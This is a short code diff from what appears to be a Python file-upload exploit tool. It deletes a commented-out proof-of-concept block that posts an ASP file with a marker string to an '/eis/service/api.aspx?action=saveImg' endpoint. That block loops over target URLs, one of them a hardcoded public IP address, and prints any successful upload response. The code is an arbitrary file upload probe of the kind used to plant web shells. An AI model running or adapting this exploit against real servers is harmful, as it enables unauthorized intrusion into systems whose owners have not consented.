@@ -11,7 +11,6 @@ import copy
 
 headers = None
 proxies = None
-# proxies = {"http": "http://127.0.0.1:10809"}
 timeout = None
 delay = None
 thread = None
@@ -20,25 +19,6 @@ MIN_VARIABLE_NUM = 1
 MAX_VARIABLE_NUM = 10
 MAX_LENGTH = 10
 BACK_PATH = list()
-
-# fileObject = {'file': ('RqxyOY9.asp', b'<% response.write("ASuDhtpoO") %>', 'Content-Type: text/html')}
-# attack_url = "/eis/service/api.aspx?action=saveImg"
-# with open('../urls.txt', 'r') as f:
-#     # urls = f.read().split()
-#     urls = ["http://218.17.53.26:8171"]
-#     for url in urls:
-#         _url = url[:-1] if url.endswith("/") else url
-#         print(f"[+] test {_url} ...")
-#         try:
-#             req = requests.post(url + attack_url, headers=None, files=fileObject, proxies=proxies, timeout=(5, 10))
-#             print(url + attack_url, headers, fileObject, proxies)
-#             if req.status_code < 300:
-#                 print(req.status_code, _url)
-#                 print(req.content.decode(req.encoding))
-#                 break
-#         except Exception as e:
-#             print(e.args.__str__())
-#             continue
 
 
 def _post_request(url: str, file: dict, headers: dict = None) -> (int, requests.Response or str):
